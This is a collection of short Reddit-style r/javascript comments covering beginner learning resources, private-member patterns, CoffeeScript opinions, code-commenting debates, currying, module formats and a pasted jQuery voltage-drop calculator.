I'd say it's a good effort, but there's certainly room for improvement. You wouldn't use `document.writeln` or `onClick` in the real world -- at all -- but for homework, we'll let that go. You have some syntax errors that you need to fix first. Paste the JavaScript portion of your code into http://www.jshint.com/ and it will tell you what's wrong, or at least tell you that there's an error around that point, and you may have to do some investigating to find out what it is. Once you've done that, post your new code in here, or to http://pastebin.com/, and we can help you work out more of the logic. Was the HTML provided for you, or did you write that yourself? i.e. do you *have* to have functions called `single()`, `married()` and `main()`?
..NSFW.
Even if it's a repost, I don't care, kickass every time, simple solution for a complex model that actually is accurate.
Looks interesting, I got some good details from your [blog post](http://blog.kenneth.io/blog/2013/04/01/visualize-your-javaScript-dependencies-with-dependo/).
I'm guessing the author wasn't aware of [node-madge](https://github.com/pahen/node-madge)?
&gt;I'm not sure whether mapping puts to console.log() is the best option, when Ruby does have a Logger class for outputting messages. Hmm good point. I pondered using puts or putc for the console, but ended up settling on puts, however that might be confusing. In Node, console.log calls a method that prints to stdout with a new line. perhaps if a `--env-node` flag is used, puts should be compile to `process.stdout.write(message + '\n');` and then alias `putc` to `console.log` to keep them separate. &gt;Do you intend Redscript to produce Javascript that will run server-side only? I intended it to be run in both environments, and i'm leaning towards defaulting to the browser since it's more popular with JS and you really can't choose a language there.
fixed in the new version. We've just updated the landing page, framework, api docs, and example app. check it out http://highf.in
We've just updated the landing page, framework, api docs, and example app. check it out http://highf.in
We've just updated the landing page, framework, api docs, and example app. check it out http://highf.in
We've just updated the landing page, framework, api docs, and example app. check it out http://highf.in
We've just updated the landing page, framework, api docs, and example app. check it out http://highf.in
We've just updated the landing page, framework, api docs, and example app. check it out http://highf.in
We've just updated the landing page, framework, api docs, and example app. check it out http://highf.in
Broken link, Accessibility fail. 
I just ran through the updated site. It's a bummer because I can tell you guys have worked hard on it but I still don't see why I would use it. Purely from the code setup, why wouldn't I just setup an Express server with a templating system like [Jade](http://jade-lang.com/)? How does your system help me get my app running faster? The only thing you really point out is your form templating but I could just as easily do that with jQuery and one of the tens of form plugins available. Really, it seems more like it would slow me down since you adamantly encourage the use of a VM. You mention project management, some sort of IM system, hosting, and drag-and-drop tools but I don't see anything discussing those in detail. There's hundreds of easy-to-use project management tools available, most people (that I know) have a Google account so we can just use GTalk, and the phrasing implies that you don't plan to host the projects yourself, merely that this framework somehow makes that easier. Not to mention, I don't know a single "serious" developer who would leave their code up to the whim of some kind of WYSIWYG tool. I really don't mean to piss in your cereal because it looks like this project has been a lot of work. I just really can't see any reason in the world to use it.
I'm actually using node-made to extract the dependencies, and then using D3 to draw the directed-graph. So yes, I'm aware of node-madge ;)
Its working now, but you can also check the sources https://github.com/globant-ui/arialinter
Maybe I'm missing something, but what's wrong with: var Person = (function(){ function Person() { }; var privateName = "Adam"; Person.prototype.name = function () {return privateName;} return Person; }()) 
Both: adam = new Person("Adam"); thomas = new Person("Thomas"); Will return "Adam": adam.name() // "Adam" thomas.name() // "Adam" You could considered it a private static variable. The is because the outer function is called immediately retuning the inner Person function as the Person constructor.
Thanks.
These are a massive time commitment but I couldn't recommend them more. Crockford on JavaScript is a series (currently 8 videos I believe) of presentations/lectures by Douglas Crockford during his time at Yahoo!: - [Volume 1: The Early Years](http://www.youtube.com/watch?v=JxAXlJEmNMg) - [Chapter 2: And Then There Was JavaScript](http://www.youtube.com/watch?v=RO1Wnu-xKoY) - [Act III: Function the Ultimate](http://www.youtube.com/watch?v=ya4UHuXNygM) - [Episode IV: The Metamorphosis of Ajax](http://www.youtube.com/watch?v=Fv9qT9joc0M) - [Part 5: The End of All Things](http://www.youtube.com/watch?v=47Ceot8yqeI) - [Scene 6: Loopage](http://www.youtube.com/watch?v=QgwSUtYSUqA) - [Level 7: ECMAScript 5: The New Parts](http://www.youtube.com/watch?v=UTEqr0IlFKY) - [Section 8: Programming Style &amp; Your Brain](http://www.youtube.com/watch?v=taaEzHI9xyY) 
more than likely the 'submit' button isn't really a button with type="submit", rather just a dummy button that triggers a javascript form handler instead. The JS handler will either submit the form via HTTP_POST or via ajax. You should pick the form apart a little better to see what's happening... OR, since they seem to use jquery, you can simulate a click of the button (assuming it has an ID attribute) by doing something like this $('#submitButtonID').click(); or this way $('#submitButtonID').trigger('click');
Is it possible to attach a texture to it?
Unfortunately the button has no ID, just the form itself. I tried my best to read the script that handles the forum but it's quite complicated and I'm far from a programmer. It appears to put together a URL but the URL passed in my console logs is not readable. It doesn't contain the code I entered but I can see where the code is passed to the script. How about something a little easier. Upon clicking submit can I fire my own event that refills the form field with the next value in the array? It's not completely automated but it's much easier than copy/pasting between tabs. I think I'll look into this.
https://github.com/umdjs/umd
thanks. This appears to be exactly what I'm looking for!
If I understood the spec correctly, then I think asm.js is the most retarded thing since brainfuck. The syntax is so bad, it realy is only useful as a compiler target. I want to be able to write more performant code with readable javascript, not mindfucks like x|0 to define x as an integer. I'm not an expert at languages, is it realy that hard to make optional static typing? I love javascript but I miss static typing so badly and hacks like this make me sad.
Thank you! Okay, feedback: Line and character position would be helpful; perhaps implement the [DOMtoSource library](https://github.com/keeganstreet/domtosource)? WCAG 2 is incompatible with HTML5. There may be revisions incoming.
The problem lies in that `this._name` is public, it can be modified, so if I have a person I can just: thomas._name = 5; and cause some problems later down the line. Hopefully another example might clear some things up. Person = (function () { var p = new Privy(); function Person(name, age) { var privates = p.initiate(this); // Set name on the privates privates.name = name; // Set age on a public property this._age = age; } Person.prototype.name = function () { return p(this).name; }; Person.prototype.age = function () { return this._age; }; }()); var adam = new Person("Adam", 32); adam.name(); // "Adam" adam.age(); // 32 adam._name = "Thomas"; adam._age = 30; adam.name(); // "Adam" adam.age(); // 30 &lt;- this is bad Although this is a trivial example it illustrate the point. The specification of a `Person` object is that it only provides getter methods to its data once it is created, this Person is immutable. Most of the time it isn't a problem exposing the properties but my intention for Privy was that it could be used when you need encapsulate data and be able to reason about its behaviour... through prototypes. A bit of a niche I know. 
DOMtoSource yes yes yes, exactly what i was looking for. thanks for the feedback! :D
Dang, I'm in the office. Is it paper doll physics with anatomically correct dolls?
To learn the language itself, regardless of the host - eloquent JavaScript - check the online version its free and JavaScript allonge. Can't go wrong with either.
That is bad, and rather weird I must say. But still, you can simply implement something like this: var Person = (function(){ var privates = {}; var instanceID = 0; function Person(name) { instanceID++; this.instanceID = instanceID; privates[instanceID] = {name: name}; } Person.prototype.name = function () { return privates[this.instanceID]['name']; }; return Person; }()); 
You can simply add a 'destruct' method and call it when you're done with the object. Person.prototype.destruct = function () { delete privates[this.instanceID]; }; 
 Lint results: Info: Color contrast ratio must be &gt; 3 for large text. The contrast between the colour of text and its background for the element is not sufficient to meet WCAG2.0.. Your page throws a warning :) Neat tool!
You could, but doing so is counter productive towards the garbage collector's efforts. You would have to design your program knowing when all parts of your code are done with the object, just like you would in C or other languages with manual memory management. 
It's in the same vein. I second that book!
I suggest [The Book of Vaadin](https://vaadin.com/book) - in other words, learn how to make use of javascript without directly knowing it is a better more powerful approach if you ask me. 
I originally wrote this library to support [my 7DRL game](http://nullprogram.com/disc-rl/). The game state is made up of collections of objects with methods: Monsters, Maps, etc. I needed to be able to serialize this game state so that I could reload it later and have all the moving parts -- methods, etc. -- working properly again. I couldn't find any other library that could actually do this. The prototype information really isn't useful to anything but the original application, which has the prototypes to reconnect. But the preservaton of circularity and identity might be. Regular JSON can't even serialize circular data structures, let alone convey that information. 
Can you add the concrete, complete but also simple example project? I can't find it yet. I see that you've improved the looks of the site, but like I said, I don't care about stuff like that. Show people how the project improves their methodologies and structure. If that isn't the purpose of the project, state that really clearly.
Damn you. I barely get jquery to work correctly.
For learning from scratch, that book is worthless. 
Great suggestion.
Since you have experience, I'd do the following: 0) Use [Codecademy's JS lessons]( http://www.codecademy.com) to pick up the syntax. You can do this in a couple of hours. 1) Like /u/miloandmilk said, read [Eloquent JavaScript](http://www.eloquentjavascript.net). Follow along in your console, etc. 2) [Try jQuery](http://www.tryjquery.com) can be finished in a few hours, and the bang for the buck is good. Use [JSHint](http://www.jshint.com). (shameless plug: /r/LearnJavaScript)
Ugh, I feel like this question is asked once a month. We should add this answer to the (nonexistent) FAQ, and we should make a lmgtfy.com for r/JavaScript.
JavaScript the good parts is fantastic. It combines nitty gritty language technical details with reasonable best practices. 
If you were a member of Siggraph, you would have seen this demo 15 years ago or more.
I once took a shit that was more interesting than this, but i'll admit i didnt play with it as long.
To just *read* JavaScript, I am going to some self-promotion and recommend [my post](http://ethantruong.net/2013/04/01/Javascript-for-NET-Java-devs.html) that's geared for Java and C# developers. To actually create robust JavaScript applications, I recommend [Professional JavaScript for Web Developers](http://www.amazon.com/Professional-JavaScript-Developers-Wrox-Guides/dp/0764579088) to get a really strong JavaScript foundation.
So how long did you play with it?
Couldn't get it to work in Chrome but I only tried for ten seconds before my kid walked in and I CTRL+W'ed the tab.
And stay away from coffeescript... (Shields up!)
&gt; We should not judge our peers solely by the quality of their code or pixels: that’s dehumanizing and wrong, and encourages individualism. That sounds like they're saying individualism is a bad thing. Am I reading that right?
judging by your username i can guess what your second question will be.
I think your crab done goofed.
Wow, that is a mess. Try this. Just save it as an html page. Every $('string') is still using jQuery to select objects. This isn't the same as selecting an element by name, as jQuery returns its own special object with a built-in "val" method. The "+" in front of those function calls is typecasting to a Number (i.e. +"12" -&gt; 12). &lt;html&gt; &lt;meta charset="UTF-8"&gt; &lt;head&gt; &lt;title&gt;Something&lt;/title&gt; &lt;script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; $(document).ready(function() { $('#voltageDropSubmit').click(function() { var voltDrop_volts = $('#voltDrop_volts'); var voltDrop_acdc = $('#voltDrop_acdc'); var voltDrop_amps = $('#voltDrop_amps'); var voltDrop_ft = $('#voltDrop_ft'); var voltDrop_awg = $('#voltDrop_awg'); var msg = null; var volts = +voltDrop_volts.val(); var amp = +voltDrop_amps.val(); var length = +voltDrop_ft.val(); var awg = +voltDrop_awg.val(); var ohm = 0; make_an_object_stupid = {36: 371.0, 34: 237.0, 32: 164.0, 30: 103.0, 28: 64.9, 26: 37.3, 24: 23.3, 22: 14.7, 20: 10.0, 18: 6.4, 16: 4.0, 14: 2.5, 12: 1.6, 10: 1.1, 8: 0.62, 6: 0.40, 4: 0.24, 2: 0.16, 1: 0.13, '1/0': 0.096, '2/0': 0.077, '3/0': 0.062, '4/0': 0.049 }; if (make_an_object_stupid) { ohm = make_an_object_stupid[awg]; } else { msg = "Error"; //This was never implemented... } var vDrop = ((ohm * 2) * (length / 1000) * amp); var vFinal = (volts - vDrop); $('.results-box').html('Drop: ' + vDrop + '\tFinal: ' + vFinal); return false; }); }); // end click submit &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Voltage Drop Calculator Tool&lt;/h1&gt; &lt;style type="text/css"&gt; &lt;!-- .calculator-wrapper td {padding:5px;} .calculator-wrapper p, .cms-page-view .main .std .calculator-wrapper p {margin:5px 0 0 0;} .calculator-wrapper {width:365px;} --&gt; &lt;/style&gt; &lt;div class="calculator-wrapper" id="voltageDropCalc" style="margin: 10px 0 20px 20px; padding: 15px;"&gt; &lt;!-- BEGIN Calc wrapper --&gt; &lt;table cellpadding="0" cellspacing="0"&gt; &lt;tbody&gt; &lt;tr&gt; &lt;td&gt; &lt;p class="field-label field-label-right"&gt;1. Initial Voltage&lt;/p&gt; &lt;/td&gt; &lt;td&gt; &lt;select class="sized" id="voltDrop_volts" size="1" style="padding: 3px;"&gt; &lt;option&gt;Choose...&lt;/option&gt; &lt;option value="12"&gt;12 Volt&lt;/option&gt; &lt;option value="24"&gt;24 Volt&lt;/option&gt; &lt;/select&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;p class="field-label field-label-right"&gt;2. AC / DC&lt;/p&gt; &lt;/td&gt; &lt;td&gt;&lt;select class="sized" id="voltDrop_acdc" size="1" style="padding: 3px;"&gt; &lt;option selected="selected" value="dc"&gt;DC&lt;/option&gt; &lt;option value="ac"&gt;AC&lt;/option&gt; &lt;/select&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;p class="field-label field-label-right"&gt;3. Current (Amps)&lt;/p&gt; &lt;/td&gt; &lt;td&gt;&lt;input align="bottom" class="sized" id="voltDrop_amps" size="15" style="padding: 3px;" type="text" /&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;p class="field-label field-label-right"&gt;4. Cable Length (ft)&lt;/p&gt; &lt;/td&gt; &lt;td&gt;&lt;input align="bottom" class="sized" id="voltDrop_ft" size="15" style="padding: 3px;" type="text" /&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;p class="field-label field-label-right"&gt;5. Cable Gauge (AWG)&lt;/p&gt; &lt;/td&gt; &lt;td&gt;&lt;input align="bottom" class="sized" id="voltDrop_awg" size="15" style="padding: 3px;" type="text" /&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;p align="center"&gt; &lt;button id="voltageDropSubmit" type="button"&gt;Calculate&lt;/button&gt; &lt;/p&gt; &lt;div class="results-box"&gt; &lt;p style="margin: 10px 0;"&gt; &lt;/p&gt; &lt;/div&gt; &lt;p&gt;Note: Industry standard is a voltage drop of no greater than 10%.&lt;/p&gt; &lt;div class="errorMsg"&gt;&lt;/div&gt;&lt;/div&gt; &lt;!-- END Calc wrapper --&gt; &lt;/body&gt; &lt;/html&gt;
This is amazing
Try me
Go home perl. You're drunk.
Cool, but gotta be careful with this stuff. Deserialization of arbitrary objects is exactly what caused many of the recent Rails security vulnerabilities. It's definitely appropriate in some contexts, but it's absolutely vital to never resurrect any data that could have been in any way tampered with by the user.
This is true. That's why there's a `revive` option that can be turned off so that prototype restoration is not performed, which *should* make it safe to deserialize arbitrary data structures. You still get circularity and identity but no behavior. 
Javascript's more like lisp than Java. 
It's really sad the situation with CoffeeScript, but in my experience there are three paths that lead you to CoffeeScript and only one of them is *acceptable* (but actually unnecessary). First path is that of people who, new or mostly new to JS prefer avoiding it (for various reasons). They pick up CoffeeScript thinking that is the way to avoid JS. The problem is that assumption is wrong. You do *not* avoid the need to know JS well by using CoffeeScript. Second path is that of those people who *think* they know JS well enough but still have problems with it. They find in CoffeeScript a way to avoid thinking about those little details they needed to pay so much attention to. The problem with this is they don't gain that "deep" (it's not *that* deep) knowledge about JS because they simply chose not to. I know many people who do not consider this a problem. I do. I firmly believe that 90% of the bad code I've seen comes from people not knowing how something actually works, irregardless of the language, platform, circumstances. Lastly, the third path is that of those who actually know JS well enough. They use CoffeeScript more as a "pure code generator" than as a language. While valid, *to me*, the gain is not really worth the effort, and I know very few peole who *knowing JavaScript well*, actually think coffeeScript is "better" (for various values of "better"). (This is my experience, of course, and I'm perfectly aware that there's a group of people who use CoffeeScript that will disagree with me because they feel they are in a different, fourth group which...) In any case, I think it is a **very good** recommendation for someone who doesn't know JS and is starting to learn it to avoid CoffeeScript. Actually both CoffeeScript and Crockford's The Good Parts (for similar reasons).
OpenTok has a pretty awesome API for this: http://www.tokbox.com/opentok/api
This is amazing. Thanks for sharing.
Peemptive [privilege check](http://i0.kym-cdn.com/photos/images/original/000/423/402/39c.jpg)
Um... for one those listed above the footer at http://modernizr.com/
They decided to go with AMD? I'm not sure I like being forced to use AMD if I want to use Modernizr (regardless of how great or crappy AMD is).
the page tries to download stuff when i want to watch it working.
lay off the adderall
I guess people who are concerned about feature detection rather than UA sniffing, and users of the HTML5 Boilerplate / Yeoman.
Not to go on a tangent but it has helped. :-)
I think they mean instead of sharing like a group you keep to yourself as you would be afraid of getting ridiculed.
You're probably right. But still, wouldn't this solve the issue with out any external libraries? newPerson = function(name){ var Person = (function (){ var name; function Person(newName) { name = newName; } Person.prototype.name = function () { return name; }; return Person; }()); return new Person(name); }; var eve = newPerson("Eve"), adam = newPerson("Adam"); eve.name(); //Eve adam.name(); //Adam
Or modafinil. 
The form either already has a JavaScrip submit handler or there is an element in the form that has name="submit". The first you can check by opening your JavaScript debugger (built in most modern browsers). Then add a breakpoint right before your .submit() call. You can then "step into" the function that's being called. Check [JavaScript debugging for beginners](http://www.netmagazine.com/tutorials/javascript-debugging-beginners) for more info. The second you can check by viewing the HTML source, of course.
Poor choice of words. It's pretty obvious that they mean isolationism. From an open source standpoint you don't want to chase someone with interesting ideas away just because they have less than perfect skills at coding or design.
http://eloquentjavascript.net/ lftl
1) The link to here from article appears to start with hhttp, not http, so the number of comments here may be limited unless that link is modified. 2) If the explicit version is faster than the clever one, then by all means, use the explicit. Otherwise, add a couple of comments to the clever one that explain what it's doing. You'll get faster code and you'll teach something to the next guy who reads it. That changes "clever" to "efficient and instructive", which should be one of the goals of all the code we write.
&gt; The link to here from article appears to start with hhttp, not http, so the number of comments here may be limited unless that link is modified. Fixed, thanks!
Try JavaScript here: http://tryjs.tistory.com/
If you've heard Douglas Crockford talk about JSLint, you'll know that explicit code is considerably easier to maintain than clever code.
The "Fine" Article doesn't disagree, it merely points out that explicit and clever are not a simple dichotomy, and gives two examples of code that is neither explicit nor clever: Jargon and Abstractions.
Checked out allong.es and learned a couple of things. I heard that curry and partial application isn't the same but never really knew the difference. What I understand now is that curry will take each argument and 'break it up' into a function that keeps returning functions for each argument which you can chain call. So I guess you use curry to create a partially applied function?
Personally, I disagree. If you have to comment your code to tell someone what it's doing, you're doing it wrong. Edit: Clarification... never write comments to tell "**what**" your code is doing. Comment to tell "**why**", not "what". If you are writing comments to work around clever code, you are writing comments for the wrong reason.
All code is clever to someone. This argument is tired and misinformed, IMO, and usually repeated by people who aren't interested in learning more by reading code above their level of understanding.
I recently ran across some "clever" code recently. It wasn't JavaScript though. It was .NET. netTiers to be exact. Somewhere along the way someone decided that the best place for Stored Procedures was in an XML file in the code base. We were trying to track down a bug and the Stored Procedure that was supposed to be called was not in the database at all. It was someone's opinion that they needed a dynamic SQL call and since their database security guy probably kicked them out of the room, they decided that implementing the stored proc on the web server was the best choice. I ended up rewriting the dynamic SQL in a stored proc that performed better and safer. If it wasn't such a huge codebase and a tight deadline, I would have pulled every single one of the Stored Procs out and put them in the SQL database where they belong.
Adding another layer of abstraction will most probably not solve your problem, but it may simplify it enough to allow an easy solution. Beware: both a lack and an abundance of simplification will lead to stupid code, regardless of how you call it "clever" or "explicit".
We have a javascript framework and server infrastructure for webrtc apps at [https://vline.com](https://vline.com).
[Currying versus partial application (with JavaScript code)](http://www.2ality.com/2011/09/currying-vs-part-eval.html) [What's the difference between Currying and Partial Application?](http://raganwald.com/2013/03/07/currying-and-partial-application.html)
"Faster", if you mean performance wise, is often the last factor that should be considered when choosing how to write code. The general consensus is that one should 1. Make it work. 2. Make it pretty (as in elegant, well designed, DRY, SOLID, etc) and finally make it fast, if necessary. 
Well, for one thing if the form actually submits to a URL (a regular form POST) it won't work, because the page will reload afterwards, so you'll only get through the first item in your array. If it's some kind of Ajax post, you will need to wait for the request to complete before doing the next iteration. Are you able to pull jQuery into your bookmarklet code? That would make it considerably easier. 
First , I was at the site. Second, thanks for no help what so ever. [\slow clap]
Ty. I'm new to jquery. Not to JavaScript. Just not sure why we'd use it... Browser detection is definitely an issue 
You never had to write comments in your code? By your standard, I'm not sure there is anyone doing it right in the real world where codes tend to be more than a few hundred lines you would write in school.
&gt;I know it was a bit too much verbal diarrhea, honestly I don't know how to condense it, how would you condense this in a non satirical way? nobody gives a single fuck that your keyboard died and the dell technician is coming to fix it. for fucks sake, why did you feel the need to include that. There is so much garbage in your post. Don't know what OS to use? You really are a noob. There is nothing wrong with windows 7 as a dev platform. I haven't had to reboot my workstation in 4 months and it sees quite a lot of heavy use. Your friend is just trying to get you to switch for his own reasons. I do hope the meds help with your ADHD, maybe you should show this post to your doctor and have him adjust your dosage. 
Comments in code point me to code that's not very well written. If I have to write a comment to tell someone else what the code is supposed to be doing, it's too "clever" and should be refactored. Edit: To put it another way. If you as the programmer decide that the code you wrote needs to have notes to let others know that it's overly complex... perhaps it's overly complex and needs to be refactored to make it more obvious what you are doing. Programming is not about saving lines of code. It's about expressively telling the computer and the programmer what you want it to do. If you can't tell another programmer what you want it to do without additional markup, you are failing at one of your tasks.
I upvoted the verbal diarrhea comment as mean as it was, but this one went way too far.
Again, you never have written comment?
I never said that. I've written comments to say **why** I did something, but OP(thread) stated you should write comments to explain **what** the code was doing.
True. I've always used Windows Node.js and meteor to test apps and never had a problem. I'll be doing myself a favor by learning Ubuntu. Well thanks for your realistic input. Will be editing.
Gratuitous abstractions and such may increase one's understanding of the language, but it has nothing to do with the functionality, maintainability and deliverability of a particular programming project.
I upvoted it too, it was funny as hell because it was honest.
Hehe, nope that doesn't solve it, that creates a new Person object not a Person constructor. You could do it without an external library just as you could dom manipulation without jQuery or similar. But why would you want to when its already been done and made easy. No I'm not saying you would even want use Privy in the first place but hopefully you get my point. I wrote a [blog post](http://thomasnadin.co.uk/2013/04/03/privy-private-members.html) on this today to explain why it works as I ended up having the same kind of conversation with a couple of people on the Internet :P Thanks for talking about it though iSmokeGaulises, it really helped me reassure myself of what I'd done!
Fine as a general rule, but there are plenty of exceptions. Suppose you didn't have `Date.prototype.getDay` and you wanted a function to get the day of the week for a date. The explicit version would involve lots of complicated logic and the clever version would just implement the one-line formula for Zeller's congruence. In this case the clever version is much easier to maintain.
Not sure why you get down votes because it's a good rule to follow. It's something I've picked up from the clean coders videos. Think the quote was: &gt; Each comment is a personal defeat. Like with all these guidelines in coding you have to take them with a grain of salt. The reason why this guideline is so extreme is so that you think of why you shouldn't write comments.
Whoosh &lt;- the sound of the article flying right over your head. "clever" almost never includes being "maintainable". Endless abstraction doesn't help teams build software. Easy to read code helps teams build software. I could code "clever" all day long by myself if I wanted to, heck I'd even enjoy entering the js1k contest - talk about **clever** code - but none of that code is useful in any way towards **building** software. The more clever you think you are, the less friendly your code is likely to be to others. 
The downvotes are people like the other commenter that think I said you should never write comments. While I have a general distaste for comments (as stated in my other post, I think they are a key identifier to bad code) I do feel that comments can point out why you chose to use a particular technique. Comments may even explain why you did something to work around a particular bug.
So, I'm entirely in the dark here. What's the advantage of either of these, over a function that just takes multiple arguments? Do you know of a good ground-up explanation I could have a look at?
Yeah. Not sure really why you are getting downvoted. I am a big subscriber to the idea that code should be self documenting. Clean beautiful code doesn't need to be explained. If you find yourself writing a bunch of comments to explain your code, there is a good chance you need to refactor. A good example would be to encapsulate a bunch of complicated logic into a function whose name explains what the code is doing instead of inlining that logic and then having to write a comment to explain it. This not only makes the code nicer looking, but it makes it more reusable. Another would be to write meaningful variable names, even if they are a bit longer. Granted, this isn't always possible. Sometimes you have to write code that has workarounds for other problems or complicated algorithms that aren't familiar to the average programmer. In which cases, comments may be necessary. In general though, I think the goal should be to avoid writing them. Edit: I also wanted to add that there are places where comments are a good thing but that scope is quite limited. Mainly, things like documenting an API. 
I can't find the article with it in but I've seen an example for a translate function where you set the language first and then on subsequent calls you supply just the key/string.
Hiya, backlift lead developer here. Check out backlift.com, it may be a good tool while you're learning angular. We've even got an angular tutorial here: https://blog.backlift.com/entry/angular-tut1 
I think you made a lot of great choices. I think that you might consider simplifying a little and then incrementally optimizing and incorporating things. I really like CoffeeScript too and I think it will make your life easier. Same thing with Ubuntu. I think I would simplify that and skip the AngularJS and RequireJS at first and just focus on D3. Later on you can see if it makes sense to optimize more or integrate more libraries or tools. You can just include a script tag, it doesn't have to be minified at first with uglify. I would just load the data from a JSON file which you can put in public/. Use Express's static feature. Also, I know that there are a lot of good tools, but I prefer to just launch my app with a little bit of bash code that has 'npm install' and coffee -c public/js/*.coffee or whatever commands I need in it. I also like to use a VPS like Rackspace, Linode, or Digital Ocean (Digital Ocean is only 5 bucks). That way you can use any software or database you want and it will be a much better value than Heroku. Just follow this https://github.com/joyent/node/wiki/Installing-Node.js-via-package-manager when you go to configure your server. Of course, heroku and nodjitsu work great. But I would spend a little time learning how to install Node etc on a VPS rather than trying to integrate ALL of those things. 
well, cheers to that.
Thanks, checking it out. Will ping you if anything.
He hasn't had to reboot his workstation in 4 months. You could learn a lot from him. brb gotta reboot
This project might be worth a look: https://github.com/anodynos/uRequire It will convert any "sensibly defined" module to a UMD style.
Proud to say I work with a team of developers that understand that explicit and clever are only weakly correlated parameters.
The best approaches I have found is using component.js to build the modules or even browserify to build the bundle. Both use the commonJS style exports though, which may be a bit foreign if you haven't used nodeJS. https://github.com/substack/node-browserify https://github.com/component/component
I recommend searching for this question before posting.
this does look neat; but it also looks pretty complicated. 30 minutes of staring and I'm still not sure how to use it either. From what I can tell, its able to work directly in `node` (I'm just working in front-end code, so that doesn't help), using `Grunt` as a step in a build process (I don't currently use a build script), or inline on the page, as an additional &lt;script&gt; which pulls in multiple other files, and does a bunch of stuff. The final option is the one which applies to me, and it seems to be a lot of overhead to solve my "problem" of confusing and verbose non-DRY syntax. Do you think its worth me exploring further? I haven't yet tried RequireJS's r.js optimizer, nor do I understand how uRequire would work with it.
Ummm.... It's working ok on Chrome and IE 10. It wouldn't surprise me if an earlier version of IE is having trouble, as IE often doesn't do simple things right. The coding is absolutely horrible. There are many ways to improve it, but it is working. 
uRequire is complicated because it encompasses many use cases. It doesn't use node to run JS, just to convert your modules. In other words, the converter is written in javascript. If you just want to be able to write felxible modules without boilerplate, I don't think there's a way to do that without some sort of build step. However, to your credit, another reason I didn't go with uRequire is because it was an additional step in the build. I would reccommend getting comfortable with Grunt, it is a huge development aid. There are plugins to do just about anything, and it might give you what you want, and then some (Clean, flexible, modules with no boilerplate.)
I've come accross this in my recent research into Modular Js. I eventually decided to use AMD and RequireJS as opposed to CommonJS since it seemed to have a bit more momentum (and I don't use node). I can (and will) check it out myself; but does the approach you suggest satisfy my requirement of all modules being able to be dropped into a project as normal &lt;script&gt;'s if desired, without depending on a script loader?
That [second article](http://raganwald.com/2013/03/07/currying-and-partial-application.html) is really good. Thanks.
Thanks; will look into grunt a bit more. I've been looking into [yeoman](http://yeoman.io/) a bit; which, if I'm not mistaken, uses (or includes?) Grunt. Like this whole AMD/CommonJS/Module thing, there's quite a bit to wrap my head around. You think I should just start with Grunt, and maybe graduate to Yeoman later if I choose?
nice. So, regarding this "adapter module"... how would that work? You load the adapter in a `&lt;script&gt;` then can drop in any of your CommonJS modules and they'll just work?
The adapter is just a module that looke like: window.foo = require("./foo"); window.bar = require("./bar"); //... This becomes the main entry point in the Browserify build, but you could also have it simply be `require`d by your real main module. Browserify encapsulates all your code and modules in a single closure, except for explicit assignments to a global object (and global leaks from failing to declare variables with `var` :P).
Yeoman is basically a "opinionated" gruntfile builder. It does a lot of the project setup automatically for you, based on the project template you use. It would get you started faster, but it might be valuable to know how all the moving pieces work underneath the hood.
Damn, alien blue made me think this was under jquery... My bad.
[Here's the link at the end of the video](https://github.com/kripken/emscripten/wiki). Looks like the've been busy. Besides the unreal 3 engine, they've also gotten Qt, LaTeX, Ruby, Python, and Lua to run in the browser, among other things. Pretty cool.
You'd push more performance out of it if you created a custom directive that manipulated the DOM directly based on a single `$watch`. Since `ng-repeat` and each `{{bind}}` and `ng-style` type directive underneath it create additional $watches, your $digests are going to be very expensive. 
Thanks to the second article, I'm going to spend 48 hours knowing the difference between partial evaluation and currying. If f is a binary function, curry(f)(3)(5) = applyLeft(f, 3)(5) And I have a vague feeling this might be useful. (And the above is not true if f is trinary!)
Thanks for the idea. I might just give that a shot, and leave them both up as a comparison.
Definitely, although I almost start to doubt if this post belongs in the subreddit "javascript"...
I wonder about performance increase if you switch to lodash
Get used to using stackoverflow.com
also jsfiddle.com 
What, what is it not doing. Looks like its validating. 
Sure. The basic thing behind performance issues that can happen with AngularJS generally revolves around directives, such as ng-bind (aka {{bind}}) or ng-style, inside an ng-repeat, creating a ton of $watches... everytime a digest is performed (which is pretty frequent) it needs to evaluate each one of these watches. So, the fewer watches the better, if you can get away with it. The trade off, of course, is that you want your app to be easy to maintain, so you have to kind of pick and choose where you want to optimize updating the DOM with custom directives. One of my favorite approaches is to create a JQuery plugin that does something like, say, render your cool spirally thing... and then call it inside of my directive on a single $watch in the linking function. This way I end up with a more performant directive/app .. *and* I have a plugin that can be used outside of the world of Angular. Food for thought. Cool project.
Perhaps instead of "encourages" they meant "discourages" ?
Haven't fully read the article, but what I have read has been well-articulated and includes helpful, real-world examples. Also, mixins are awesome.
Seems like a very nice client-side companion to Express on the server side.
Any idea if it is better / worse than pathjs?
Well if you want to store it in a file, you can use the [HTML5 File api](https://developer.mozilla.org/en-US/docs/Using_files_from_web_applications) to write it. You could also use [localStorage](https://developer.mozilla.org/en-US/docs/DOM/Storage#localStorage) to hold the data. 
What you look like you are wanting to do is [Serialization](http://en.wikipedia.org/wiki/Serialization)? Saving data to/extracting from disk, as a file. &gt; serialization is the process of translating data structures or object state into a format that can be stored ... and "resurrected" later in the same or another computer environment. Or you need to look at something like [PHP, MySql &amp; Javascript](http://www.amazon.com/Learning-PHP-MySQL-JavaScript-Step-By-Step/dp/0596157134) to have a server and save the stuff to a database.
This page has a really great structure to it: http://javascriptissexy.com/how-to-learn-javascript-properly/ It asks you to buy a book, and makes recommendations for "experienced programmer wanting to learn JS" vs "brand new programmer". It's really good; I highly recommend it.
What way should i use? EDIT: Should I use the Date() methods?
I think localStorage is the best fit for this scenario. I don't think being able to export a custom text adventure game's internal data structure will have much use to end users.
[Here's one I made earlier](https://github.com/mrchimp/Tock) See the linked article in the readme for an explanation...or just use mine.
Grab the delta of the current time from the last recorded time, and add that. setInterval isn't guaranteed to be called at the interval you put in. It can easily be seen in chrome if you leave it up and switch to a different tab. Chrome then calls it at ~1 time a second. 
Im sorry, but do you mean everyonce in a while grab the current time, store it in a variable, then after a short while, add the time it took in between and repeat?
Ok thanks
